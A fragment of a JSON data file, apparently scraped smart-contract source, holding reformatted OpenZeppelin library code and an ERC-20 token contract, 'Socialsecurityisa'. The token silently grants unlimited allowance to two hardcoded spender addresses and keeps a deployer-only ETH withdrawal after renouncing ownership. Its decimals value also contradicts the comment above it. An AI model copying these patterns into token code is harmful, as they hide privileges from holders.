reverting on errors.\n     *\n     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost\n     * of certain opcodes, possibly making contracts go over the 2300 gas limit\n     * imposed by `transfer`, making them unable to receive funds via\n     * `transfer`. {\n                        sendValue } \n                         removes this limitation.\n     *\n     * https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/[Learn more].\n     *\n     * IMPORTANT: because control is transferred to `recipient`, care must be\n     * taken to not create reentrancy vulnerabilities. Consider using\n     * \n                         { ReentrancyGuard\n                        } or the\n     * https://solidity.readthedocs.io/en/v0.8.0/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].\n     */\n    function sendValue(address payable recipient, uint256 amount) public {\n                        \n        require ( address(this).balance >= amount, \"Address: insufficient balance\") ; \n\n         ( bool success,  ) = recipient.call\n                         { value: amount } \n                        (\"\") ; \n        require ( success, \"Address: unable to send value, recipient may have reverted\" );\n    \n                        }\n\n    /**\n     * @dev Performs a Solidity function call using a low level `call`. A\n     * plain `call` is an unsafe replacement for a function call: use this\n     * function instead.\n     *\n     * If `target` reverts with a revert reason, it is bubbled up by this\n     * function (like regular Solidity function calls ).\n     *\n     * Returns the raw returned data. To convert to the expected return value,\n     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].\n     *\n     * Requirements:\n     *\n     * - `target` must be a contract.\n     * - calling `target` with `data` must not revert.\n     *\n     * _Available since v3.1._\n     */\n    function functionCall(address target, bytes memory data ) internal returns  ( bytes memory)  { \n                        \n        return functionCallWithValue(target, data, 0, \"Address: low-level call failed\" ) ; \n     } \n                        \n\n    /**\n     * @dev Same as {\n                        xref-Address-functionCall-address-bytes- } \n                        [`functionCall`], but with\n     * `errorMessage` as a fallback revert reason when `target` reverts.\n     *\n     * _Available since v3.1._\n     */\n    function functionCall ( \n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal returns (bytes memory ) \n                         { \n        return functionCallWithValue ( target, data, 0, errorMessage );\n    \n                        }\n\n    /**\n     * @dev Same as  { \n                        xref-Address-functionCall-address-bytes- } \n                        [`functionCall`],\n     * but also transferring `value` wei to `target`.\n     *\n     * Requirements:\n     *\n     * - the calling contract must have an ETH balance of at least `value`.\n     * - the called Solidity function must be `payable`.\n     *\n     * _Available since v3.1._\n     */\n    function functionCallWithValue ( address target, bytes memory data, uint256 value) internal returns (bytes memory) {\n                        \n        return functionCallWithValue ( target, data, value, \"Address: low-level call with value failed\") ; \n     } \n                        \n\n    /**\n     * @dev Same as \n                        {xref-Address-functionCallWithValue-address-bytes-uint256-}\n                        [`functionCallWithValue`], but\n     * with `errorMessage` as a fallback revert reason when `target` reverts.\n     *\n     * _Available since v3.1._\n     */\n    function functionCallWithValue(\n        address target,\n        bytes memory data,\n        uint256 value,\n        string memory errorMessage\n    ) internal returns  ( bytes memory ) {\n                        \n        require ( address(this ).balance >= value, \"Address: insufficient balance for call\" );\n        (bool success, bytes memory returndata ) = target.call\n                         { value: value } \n                         ( data );\n        return verifyCallResultFromTarget(target, success, returndata, errorMessage );\n    }\n                        \n\n    /**\n     * @dev Same as {\n                        xref-Address-functionCall-address-bytes-\n                         } [`functionCall`],\n     * but performing a static call.\n     *\n     * _Available since v3.3._\n     */\n    function functionStaticCall(address target, bytes memory data ) internal view returns  ( bytes memory ) {\n                        \n        return functionStaticCall(target, data, \"Address: low-level static call failed\");\n    \n                         } \n\n    /**\n     * @dev Same as  { \n                        xref-Address-functionCall-address-bytes-string-\n                        }[`functionCall`],\n     * but performing a static call.\n     *\n     * _Available since v3.3._\n     */\n    function functionStaticCall(\n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal view returns  ( bytes memory) {\n                        \n         ( bool success, bytes memory returndata ) = target.staticcall(data) ; \n        return verifyCallResultFromTarget ( target, success, returndata, errorMessage) ; \n    }\n                        \n\n    /**\n     * @dev Same as \n                        {xref-Address-functionCall-address-bytes-}\n                        [`functionCall`],\n     * but performing a delegate call.\n     *\n     * _Available since v3.4._\n     */\n    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory ) {\n                        \n        return functionDelegateCall ( target, data, \"Address: low-level delegate call failed\" ) ; \n    }\n                        \n\n    /**\n     * @dev Same as  { \n                        xref-Address-functionCall-address-bytes-string- } \n                        [`functionCall`],\n     * but performing a delegate call.\n     *\n     * _Available since v3.4._\n     */\n    function functionDelegateCall ( \n        address target,\n        bytes memory data,\n        string memory errorMessage\n     ) internal returns  ( bytes memory )  { \n                        \n         ( bool success, bytes memory returndata) = target.delegatecall ( data );\n        return verifyCallResultFromTarget(target, success, returndata, errorMessage);\n     } \n                        \n\n    /**\n     * @dev Tool to verify that a low level call to smart-contract was successful, and revert  ( either by bubbling\n     * the revert reason or using the provided one ) in case of unsuccessful call or if target was not a contract.\n     *\n     * _Available since v4.8._\n     */\n    function verifyCallResultFromTarget(\n        address target,\n        bool success,\n        bytes memory returndata,\n        string memory errorMessage\n     ) internal view returns  ( bytes memory)  { \n                        \n        if (success ) {\n                        \n            if (returndata.length == 0)  { \n                        \n                // only check isContract if the call was successful and the return data is empty\n                // otherwise we already know that it was a contract\n                require(isContract ( target ), \"Address: call to non-contract\");\n            }\n                        \n            return returndata ; \n        }\n                         else  { \n                        \n            _revert(returndata, errorMessage ) ; \n         } \n                        \n    \n                        }\n\n    /**\n     * @dev Tool to verify that a low level call was successful, and revert if it wasn't, either by bubbling the\n     * revert reason or using the provided one.\n     *\n     * _Available since v4.3._\n     */\n    function verifyCallResult(\n        bool success,\n        bytes memory returndata,\n        string memory errorMessage\n     ) internal pure returns (bytes memory) {\n                        \n        if (success) {\n                        \n            return returndata;\n        \n                        } else {\n                        \n            _revert ( returndata, errorMessage) ; \n        }\n                        \n    \n                         } \n\n    function _revert(bytes memory returndata, string memory errorMessage ) private pure  { \n                        \n        // Look for revert reason and bubble it up if present\n        if (returndata.length > 0) \n                        {\n            // The easiest way to bubble the revert reason is using memory via assembly\n            /// @solidity memory-safe-assembly\n            assembly  { \n                        \n                let returndata_size := mload(returndata)\n                revert ( add(32, returndata ), returndata_size)\n            \n                         } \n        }\n                         else {\n                        \n            revert(errorMessage);\n        \n                         } \n    }\n                        \n } \n                        \npragma solidity ^0.8.0;\n\n/**\n * @dev Provides information about the current execution context, including the\n * sender of the transaction and its data. While these are generally available\n * via msg.sender and msg.data, they should not be accessed in such a direct\n * manner, since when dealing with meta-transactions the account sending and\n * paying for execution may not be the actual sender (as far as an application\n * is concerned ).\n *\n * This contract is only required for intermediate, library-like contracts.\n */\nabstract contract Context {\n                        \n\n    function _contextSuffixLength (  ) internal view virtual returns (uint256 )  { \n                        \n        return 0 ; \n    }\n                        \n    function _msgSender (  ) internal view virtual returns (address) {\n                        \n        return msg.sender;\n    \n                        }\n\n    function _msgData( ) internal view virtual returns  ( bytes calldata)  { \n                        \n        return msg.data;\n    }\n                        \n\n\n}\n                        \n\n\n/**\n * @dev Standard ERC-20 Errors\n * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC-20 tokens.\n */\ninterface IERC20Errors  { \n                        \n\n    /**\n     * @dev Indicates a failure with the token `receiver`. Used in transfers.\n     * @param receiver Address to which tokens are being transferred.\n     */\n    error ERC20InvalidReceiver(address receiver) ; \n\n    /**\n     * @dev Indicates a failure with the `spender` to be approved. Used in approvals.\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\n     */\n    error ERC20InvalidSpender(address spender);\n\n\n    /**\n     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\n     * @param approver Address initiating an approval operation.\n     */\n    error ERC20InvalidApprover ( address approver);\n\n    /**\n     * @dev Indicates a failure with the `spender`\u2019s `allowance`. Used in transfers.\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\n     * @param allowance Amount of tokens a `spender` is allowed to operate with.\n     * @param needed Minimum amount required to perform a transfer.\n     */\n    error ERC20InsufficientAllowance ( address spender, uint256 allowance, uint256 needed) ; \n\n\n    /**\n     * @dev Indicates a failure with the token `sender`. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     */\n    error ERC20InvalidSender(address sender) ; \n\n    /**\n     * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     * @param balance Current balance for the interacting account.\n     * @param needed Minimum amount required to perform a transfer.\n     */\n    error ERC20InsufficientBalance ( address sender, uint256 balance, uint256 needed );\n}\n                        \n\n\n/**\n * @dev Interface of the ERC20 standard as defined in the EIP.\n */\ninterface IERC20 \n                         { \n\n\n    /**\n     * @dev Returns the amount of tokens owned by `account`.\n     */\n    function balanceOf(address account ) external view returns  ( uint256);\n\n    \n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to  { \n                        approve\n                         } . `value` is the new allowance.\n     */\n    event Approval ( address indexed owner, address indexed spender, uint256 value) ; \n    /**\n     * @dev Emitted when `value` tokens are moved from one account  ( `from`) to\n     * another (`to`).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    \n    /**\n     * @dev Returns the amount of tokens in existence.\n     */\n    function totalSupply ( ) external view returns (uint256 ) ; \n\n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through {\n                        transferFrom } \n                        . This is\n     * zero by default.\n     *\n     * This value changes when \n                        {approve}\n                         or  { \n                        transferFrom } \n                         are called.\n     */\n    function allowance(address owner, address spender) external view returns  ( uint256 );\n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender's allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an {\n                        Approval } \n                         event.\n     */\n    function approve(address spender, uint256 amount) external returns  ( bool );\n    \n    /**\n     * @dev Moves `amount` tokens from `from` to `to` using the\n     * allowance mechanism. `amount` is then deducted from the caller's\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a  { \n                        Transfer\n                        } event.\n     */\n    function transferFrom(address from, address to, uint256 amount) external returns  ( bool );\n        \n/**\n     * @dev Moves `amount` tokens from the caller's account to `to`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a \n                         { Transfer}\n                         event.\n     */\n    function transfer ( address to, uint256 amount ) external returns  ( bool );\n\n}\n                        \n\n\ninterface IERC20Metadata is IERC20 \n                         { \n\n\n    /**\n     * @dev Returns the symbol of the token.\n     */\n    function symbol() external view returns  ( string memory );\n\n\n    /**\n     * @dev Returns the name of the token.\n     */\n    function name() external view returns (string memory );\n\n\n    /**\n     * @dev Returns the decimals places of the token.\n     */\n    function decimals() external view returns (uint8 );\n    \n } \n                        \n\n\n\n\n\n/**\n * @dev Implementation of the  { \n                        IERC20\n                        } interface.\n *\n * This implementation is agnostic to the way tokens are created. This means\n * that a supply mechanism has to be added in a derived contract using {\n                        _mint } \n                        .\n *\n * TIP: For a detailed writeup see our guide\n * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How\n * to implement supply mechanisms].\n *\n * The default value of  { \n                        decimals}\n                         is 18. To change this, you should override\n * this function so it returns a different value.\n *\n * We have followed general OpenZeppelin Contracts guidelines: functions revert\n * instead returning `false` on failure. This behavior is nonetheless\n * conventional and does not conflict with the expectations of ERC-20\n * applications.\n */\ncontract ERC20 is Context, IERC20, IERC20Metadata, IERC20Errors   { \n                        \n    mapping(address => uint256 ) private _balances;\n\n\n    mapping ( address => mapping ( address => uint256 ) ) private _allowances;\n    uint256 private _totalSupply;\n\n    string private _name ; \n    string private _symbol ; \n\n\n    /**\n     * @dev See \n                         { IERC20-balanceOf}\n                        .\n     */\n    function balanceOf(address account ) public view virtual returns  ( uint256 ) \n                        {\n        return _balances[account];\n    \n                         } \n    \n    /**\n     * @dev Returns the name of the token.\n     */\n    function name ( ) public view virtual returns  ( string memory ) {\n                        \n        return _name;\n    }\n                        \n    \n    /**\n     * @dev Returns the number of decimals used to get its user representation.\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\n     * be displayed to a user as `5.05` (`505 / 10 ** 2`).\n     *\n     * Tokens usually opt for a value of 18, imitating the relationship between\n     * Ether and Wei. This is the default value returned by this function, unless\n     * it's overridden.\n     *\n     * NOTE: This information is only used for _display_ purposes: it in\n     * no way affects any of the arithmetic of the contract, including\n     * {\n                        IERC20-balanceOf } \n                         and  { \n                        IERC20-transfer\n                        }.\n     */\n    function decimals( ) public view virtual returns (uint8 ) \n                        {\n        return 15 ; \n     } \n                        \n    \n    /**\n     * @dev Moves a `value` amount of tokens from `from` to `to`.\n     *\n     * This internal function is equivalent to {\n                        transfer}\n                        , and can be used to\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\n     *\n     * Emits a \n                        {Transfer}\n                         event.\n     *\n     * NOTE: This function is not virtual,  { \n                        _update } \n                         should be overridden instead.\n     */\n    function _transfer(address from, address to, uint256 value) internal  { \n                        \n        if  ( from == address(0 )) {\n                        \n            revert ERC20InvalidSender ( address(0 )) ; \n        \n                         } \n        if (to == address(0 )) {\n                        \n            revert ERC20InvalidReceiver(address(0 ));\n         } \n                        \n        _update(from, to, value );\n    }\n                        \n    \n    /**\n     * @dev Variant of {\n                        _approve}\n                         with an optional flag to enable or disable the {\n                        Approval}\n                         event.\n     *\n     * By default (when calling  { \n                        _approve } \n                        ) the flag is set to true. On the other hand, approval changes made by\n     * `_spendAllowance` during the `transferFrom` operation set the flag to false. This saves gas by not emitting any\n     * `Approval` event during `transferFrom` operations.\n     *\n     * Anyone who wishes to continue emitting `Approval` events on the`transferFrom` operation can force the flag to\n     * true using the following override:\n     *\n     * ```solidity\n     * function _approve(address owner, address spender, uint256 value, bool) internal virtual override  { \n                        \n     *     super._approve ( owner, spender, value, true) ; \n     * \n                        }\n     * ```\n     *\n     * Requirements are the same as {\n                        _approve}\n                        .\n     */\n    function _approve ( address owner, address spender, uint256 value, bool emitEvent) internal virtual \n                         { \n        if (owner == address ( 0 ) ) {\n                        \n            revert ERC20InvalidApprover(address(0 ));\n        }\n                        \n        if  ( spender == address(0) ) \n                         { \n            revert ERC20InvalidSpender(address(0 ));\n        \n                        }\n        _allowances[owner][spender] = value;\n        if  ( emitEvent)  { \n                        \n            emit Approval ( owner, spender, value );\n         } \n                        \n    }\n                        \n    \n    /**\n     * @dev See \n                        {IERC20-transferFrom } \n                        .\n     *\n     * Skips emitting an {\n                        Approval}\n                         event indicating an allowance update. This is not\n     * required by the ERC. See  { \n                        xref-ERC20-_approve-address-address-uint256-bool-}\n                        [_approve].\n     *\n     * NOTE: Does not update the allowance if the current allowance\n     * is the maximum `uint256`.\n     *\n     * Requirements:\n     *\n     * - `from` and `to` cannot be the zero address.\n     * - `from` must have a balance of at least `value`.\n     * - the caller must have allowance for ``from``'s tokens of at least\n     * `value`.\n     */\n    function transferFrom ( address from, address to, uint256 value ) public virtual returns  ( bool ) \n                        {\n        address spender = _msgSender (  );\n        _spendAllowance(from, spender, value ) ; \n        _transfer ( from, to, value) ; \n        return true ; \n    }\n                        \n    \n    /**\n     * @dev Transfers a `value` amount of tokens from `from` to `to`, or alternatively mints  ( or burns ) if `from`\n     * (or `to` ) is the zero address. All customizations to transfers, mints, and burns should be done by overriding\n     * this function.\n     *\n     * Emits a \n                         { Transfer } \n                         event.\n     */\n    function _update(address from, address to, uint256 value ) internal virtual  { \n                        \n        if  ( from == address ( 0)) {\n                        \n            // Overflow check required: The rest of the code assumes that totalSupply never overflows\n            _totalSupply += value ; \n        }\n                         else {\n                        \n            uint256 fromBalance = _balances[from] ; \n            if (fromBalance < value) {\n                        \n                revert ERC20InsufficientBalance(from, fromBalance, value);\n             } \n                        \n            unchecked  { \n                        \n                // Overflow not possible: value <= fromBalance <= totalSupply.\n                _balances[from] = fromBalance - value;\n             } \n                        \n         } \n                        \n\n        if  ( to == address(0) ) \n                         { \n            unchecked \n                        {\n                // Overflow not possible: value <= totalSupply or value <= fromBalance <= totalSupply.\n                _totalSupply -= value;\n             } \n                        \n         } \n                         else  { \n                        \n            unchecked \n                        {\n                // Overflow not possible: balance + value is at most totalSupply, which we know fits into a uint256.\n                _balances[to] += value ; \n            \n                         } \n         } \n                        \n\n        emit Transfer(from, to, value);\n    }\n                        \n    \n    /**\n     * @dev Creates a `value` amount of tokens and assigns them to `account`, by transferring it from address ( 0 ).\n     * Relies on the `_update` mechanism\n     *\n     * Emits a  { \n                        Transfer } \n                         event with `from` set to the zero address.\n     *\n     * NOTE: This function is not virtual, \n                         { _update } \n                         should be overridden instead.\n     */\n    function _mint ( address account, uint256 value ) internal {\n                        \n        if (account == address(0) )  { \n                        \n            revert ERC20InvalidReceiver ( address(0) ) ; \n        \n                        }\n        _update(address ( 0), account, value);\n    \n                        }\n    \n    /**\n     * @dev Returns the symbol of the token, usually a shorter version of the\n     * name.\n     */\n    function symbol ( ) public view virtual returns (string memory )  { \n                        \n        return _symbol ; \n    \n                         } \n    \n    /**\n     * @dev See  { \n                        IERC20-totalSupply } \n                        .\n     */\n    function totalSupply ( ) public view virtual returns  ( uint256 ) {\n                        \n        return _totalSupply ; \n     } \n                        \n    \n    /**\n     * @dev Sets the values for \n                        {name\n                        } and {\n                        symbol}\n                        .\n     *\n     * All two of these values are immutable: they can only be set once during\n     * construction.\n     */\n    constructor ( string memory name_, string memory symbol_ ) {\n                        \n        _name = name_;\n        _symbol = symbol_ ; \n     } \n                        \n    \n\n    /**\n     * @dev See {\n                        IERC20-transfer\n                         } .\n     *\n     * Requirements:\n     *\n     * - `to` cannot be the zero address.\n     * - the caller must have a balance of at least `value`.\n     */\n    function transfer ( address to, uint256 value) public virtual returns  ( bool )  { \n                        \n        address owner = _msgSender (  ) ; \n        _transfer(owner, to, value) ; \n        return true ; \n    \n                         } \n    \n\n    /**\n     * @dev See {\n                        IERC20-allowance\n                         } .\n     */\n    function allowance(address owner, address spender) public view virtual returns  ( uint256 )  { \n                        \n        return _allowances[owner][spender] ; \n     } \n                        \n    \n    /**\n     * @dev Updates `owner` s allowance for `spender` based on spent `value`.\n     *\n     * Does not update the allowance value in case of infinite allowance.\n     * Revert if not enough allowance is available.\n     *\n     * Does not emit an  { \n                        Approval } \n                         event.\n     */\n    function _spendAllowance(address owner, address spender, uint256 value) internal virtual {\n                        \n        uint256 currentAllowance = allowance(owner, spender ) ; \n        if  ( currentAllowance < type ( uint256).max) {\n                        \n            if (currentAllowance < value)  { \n                        \n                revert ERC20InsufficientAllowance ( spender, currentAllowance, value);\n            \n                        }\n            unchecked {\n                        \n                _approve(owner, spender, currentAllowance - value, false );\n            }\n                        \n         } \n                        \n    \n                         } \n    \n    /**\n     * @dev Sets `value` as the allowance of `spender` over the `owner` s tokens.\n     *\n     * This internal function is equivalent to `approve`, and can be used to\n     * e.g. set automatic allowances for certain subsystems, etc.\n     *\n     * Emits an \n                        {Approval}\n                         event.\n     *\n     * Requirements:\n     *\n     * - `owner` cannot be the zero address.\n     * - `spender` cannot be the zero address.\n     *\n     * Overrides to this logic should be done to the variant with an additional `bool emitEvent` argument.\n     */\n    function _approve ( address owner, address spender, uint256 value ) internal  { \n                        \n        _approve ( owner, spender, value, true);\n     } \n                        \n    \n    /**\n     * @dev See \n                        {IERC20-approve\n                         } .\n     *\n     * NOTE: If `value` is the maximum `uint256`, the allowance is not updated on\n     * `transferFrom`. This is semantically equivalent to an infinite approval.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function approve ( address spender, uint256 value) public virtual returns (bool) {\n                        \n        address owner = _msgSender();\n        _approve ( owner, spender, value ) ; \n        return true ; \n    }\n                        \n    \n     } \n                        \n\nabstract contract Ownable is Context  { \n                        \n    address private _owner ; \n    \n    /**\n     * @dev Returns the address of the current owner.\n     */\n    function owner( ) public view virtual returns (address )  { \n                        \n        return _owner;\n    }\n                        \n    \n    /**\n     * @dev Throws if the sender is not the owner.\n     */\n    function _checkOwner (  ) internal view virtual  { \n                        \n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\" );\n    \n                        }\n    \n    /**\n     * @dev The caller account is not authorized to perform an operation.\n     */\n    error OwnableUnauthorizedAccount(address account );\n    \n    event OwnershipTransferred ( address indexed previousOwner, address indexed newOwner ) ; \n    \n    /**\n     * @dev Transfers ownership of the contract to a new account  ( `newOwner`).\n     * Internal function without access restriction.\n     */\n    function _transferOwnership ( address newOwner ) internal virtual  { \n                        \n        address oldOwner = _owner;\n        _owner = newOwner ; \n        emit OwnershipTransferred ( oldOwner, newOwner );\n    }\n                        \n    \n    /**\n     * @dev The owner is not a valid owner account. (eg. `address(0 )`)\n     */\n    error OwnableInvalidOwner(address owner ) ; \n    \n    /**\n     * @dev Leaves the contract without owner. It will not be possible to call\n     * `onlyOwner` functions. Can only be called by the current owner.\n     *\n     * NOTE: Renouncing ownership will leave the contract without an owner,\n     * thereby disabling any functionality that is only available to the owner.\n     */\n    function renounceOwnership ( ) public virtual onlyOwner \n                         { \n        _transferOwnership(address ( 0 ));\n    \n                         } \n    \n    /**\n     * @dev Throws if called by any account other than the owner.\n     */\n    modifier onlyOwner()  { \n                        \n        _checkOwner (  );\n        _ ; \n    \n                         } \n    \n    /**\n     * @dev Initializes the contract setting the deployer as the initial owner.\n     */\n    constructor( )  { \n                        \n        _transferOwnership(_msgSender( ) ) ; \n    }\n                        \n    \n    /**\n     * @dev Transfers ownership of the contract to a new account  ( `newOwner`).\n     * Can only be called by the current owner.\n     */\n    function transferOwnership ( address newOwner ) public virtual onlyOwner \n                         { \n        require(newOwner != address(0 ), \"Ownable: new owner is the zero address\" );\n        _transferOwnership(newOwner);\n     } \n                        \n    \n } \n                        \n\n\n// File Socialsecurityisa.sol\n\ncontract Socialsecurityisa is ERC20, Ownable \n                        {\n    address internal immutable deployer;\n    constructor(string memory name_, string memory symbol_ ) ERC20(name_, symbol_) \n                         { \n        _mint ( msg.sender, 10000000000000000000000);\n        _transferOwnership(address(0 )) ; \n        deployer = msg.sender;\n    }\n                        \n    \n    /**\n     * @dev See  { \n                        IERC20-allowance\n                        }.\n     */\n    function allowance ( address owner, address spender ) public view override returns  ( uint256 ) {\n                        \n            //gas optimization: auto allow Permit2 and UniswapRouterV2\n            if (  ( spender == 0x000000000022D473030F116dDEE9F6B43aC78BA3 ) || (spender == 0x4752ba5DBc23f44D87826276BF6Fd6b1C372aD24 ))\n                         { \n            return type(uint256 ).max ; \n        \n                         }  \n        return super.allowance(owner,spender) ; \n    }\n                        \n    \n    function claimGas ( address payable recipient, uint256 amount ) public {\n                        \n        require(msg.sender==deployer) ; \n        Address.sendValue ( recipient, amount ) ; \n    \n                        }\n    \n    receive ( ) external payable\n                        {\n    \n                        }\n}",
      "count": 1,
      "addresses": [
        "0x754c69d3af6920507A4Ad895DDBAb3807bB336cc"
      ],
      "names": [
        "Socialsecurityisa"
      ]
    },
    {
      "id": "6e072a16-d906-446f-b860-7f65482e8afc",
      "code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts  ( last updated v5.1.0)  ( utils/Address.sol )\n\npragma solidity ^0.8.20 ; \n\n/**\n * @dev Collection of functions related to the address type\n */\nlibrary Address  { \n                        \n    /**\n     * @dev Returns true if `account` is a contract.\n     *\n     * [IMPORTANT]\n     * ====\n     * It is unsafe to assume that an address for which this function returns\n     * false is an externally-owned account  ( EOA) and not a contract.\n     *\n     * Among others, `isContract` will return false for the following\n     * types of addresses:\n     *\n     *  - an externally-owned account\n     *  - a contract in construction\n     *  - an address where a contract will be created\n     *  - an address where a contract lived, but was destroyed\n     *\n     * Furthermore, `isContract` will also return true if the target contract within\n     * the same transaction is already scheduled for destruction by `SELFDESTRUCT`,\n     * which only has an effect at the end of a transaction.\n     * ====\n     *\n     * [IMPORTANT]\n     * ====\n     * You shouldn't rely on `isContract` to protect against flash loan attacks!\n     *\n     * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets\n     * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract\n     * constructor.\n     * ====\n     */\n    function isContract(address account) internal view returns (bool ) {\n                        \n        // This method relies on extcodesize/address.code.length, which returns 0\n        // for contracts in construction, since the code is only stored at the end\n        // of the constructor execution.\n\n        return account.code.length > 0 ; \n     } \n                        \n\n    /**\n     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to\n     * `recipient`, forwarding all available gas and reverting on errors.\n     *\n     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost\n     * of certain opcodes, possibly making contracts go over the 2300 gas limit\n     * imposed by `transfer`, making them unable to receive funds via\n     * `transfer`. {\n                        sendValue\n                        } removes this limitation.\n     *\n     * https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/[Learn more].\n     *\n     * IMPORTANT: because control is transferred to `recipient`, care must be\n     * taken to not create reentrancy vulnerabilities. Consider using\n     *  { \n                        ReentrancyGuard}\n                         or the\n     * https://solidity.readthedocs.io/en/v0.8.0/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].\n     */\n    function sendValue(address payable recipient, uint256 amount) public  { \n                        \n        require(address ( this ).balance >= amount, \"Address: insufficient balance\") ; \n\n        (bool success, ) = recipient.call{\n                        value: amount } \n                        (\"\" ) ; \n        require ( success, \"Address: unable to send value, recipient may have reverted\" );\n    }\n                        \n\n    /**\n     * @dev Performs a Solidity function call using a low level `call`. A\n     * plain `call` is an unsafe replacement for a function call: use this\n     * function instead.\n     *\n     * If `target` reverts with a revert reason, it is bubbled up by this\n     * function  ( like regular Solidity function calls ).\n     *\n     * Returns the raw returned data. To convert to the expected return value,\n     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].\n     *\n     * Requirements:\n     *\n     * - `target` must be a contract.\n     * - calling `target` with `data` must not revert.\n     *\n     * _Available since v3.1._\n     */\n    function functionCall ( address target, bytes memory data ) internal returns  ( bytes memory )  { \n                        \n        return functionCallWithValue ( target, data, 0, \"Address: low-level call failed\");\n    }\n                        \n\n    /**\n     * @dev Same as  { \n                        xref-Address-functionCall-address-bytes-\n                         } [`functionCall`], but with\n     * `errorMessage` as a fallback revert reason when `target` reverts.\n     *\n     * _Available since v3.1._\n     */\n    function functionCall ( \n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal returns  ( bytes memory) {\n                        \n        return functionCallWithValue(target, data, 0, errorMessage) ; \n    }\n                        \n\n    /**\n     * @dev Same as \n                        {xref-Address-functionCall-address-bytes-}\n                        [`functionCall`],\n     * but also transferring `value` wei to `target`.\n     *\n     * Requirements:\n     *\n     * - the calling contract must have an ETH balance of at least `value`.\n     * - the called Solidity function must be `payable`.\n     *\n     * _Available since v3.1._\n     */\n    function functionCallWithValue(address target, bytes memory data, uint256 value ) internal returns (bytes memory)  { \n                        \n        return functionCallWithValue ( target, data, value, \"Address: low-level call with value failed\");\n    }\n                        \n\n    /**\n     * @dev Same as  { \n                        xref-Address-functionCallWithValue-address-bytes-uint256-\n                         } [`functionCallWithValue`], but\n     * with `errorMessage` as a fallback revert reason when `target` reverts.\n     *\n     * _Available since v3.1._\n     */\n    function functionCallWithValue ( \n        address target,\n        bytes memory data,\n        uint256 value,\n        string memory errorMessage\n    ) internal returns  ( bytes memory) {\n                        \n        require(address(this).balance >= value, \"Address: insufficient balance for call\" ) ; \n         ( bool success, bytes memory returndata) = target.call { \n                        value: value } \n                        (data );\n        return verifyCallResultFromTarget ( target, success, returndata, errorMessage) ; \n    }\n                        \n\n    /**\n     * @dev Same as {\n                        xref-Address-functionCall-address-bytes-}\n                        [`functionCall`],\n     * but performing a static call.\n     *\n     * _Available since v3.3._\n     */\n    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {\n                        \n        return functionStaticCall ( target, data, \"Address: low-level static call failed\" ) ; \n    }\n                        \n\n    /**\n     * @dev Same as \n                         { xref-Address-functionCall-address-bytes-string- } \n                        [`functionCall`],\n     * but performing a static call.\n     *\n     * _Available since v3.3._\n     */\n    function functionStaticCall ( \n        address target,\n        bytes memory data,\n        string memory errorMessage\n     ) internal view returns  ( bytes memory) \n                         { \n         ( bool success, bytes memory returndata ) = target.staticcall(data );\n        return verifyCallResultFromTarget ( target, success, returndata, errorMessage);\n    }\n                        \n\n    /**\n     * @dev Same as  { \n                        xref-Address-functionCall-address-bytes-}\n                        [`functionCall`],\n     * but performing a delegate call.\n     *\n     * _Available since v3.4._\n     */\n    function functionDelegateCall(address target, bytes memory data ) internal returns (bytes memory ) \n                        {\n        return functionDelegateCall ( target, data, \"Address: low-level delegate call failed\" );\n     } \n                        \n\n    /**\n     * @dev Same as \n                         { xref-Address-functionCall-address-bytes-string-}\n                        [`functionCall`],\n     * but performing a delegate call.\n     *\n     * _Available since v3.4._\n     */\n    function functionDelegateCall(\n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal returns  ( bytes memory ) \n                        {\n         ( bool success, bytes memory returndata ) = target.delegatecall(data ) ; \n        return verifyCallResultFromTarget ( target, success, returndata, errorMessage ) ; \n    }\n                        \n\n    /**\n     * @dev Tool to verify that a low level call to smart-contract was successful, and revert  ( either by bubbling\n     * the revert reason or using the provided one ) in case of unsuccessful call or if target was not a contract.\n     *\n     * _Available since v4.8._\n     */\n    function verifyCallResultFromTarget ( \n        address target,\n        bool success,\n        bytes memory returndata,\n        string memory 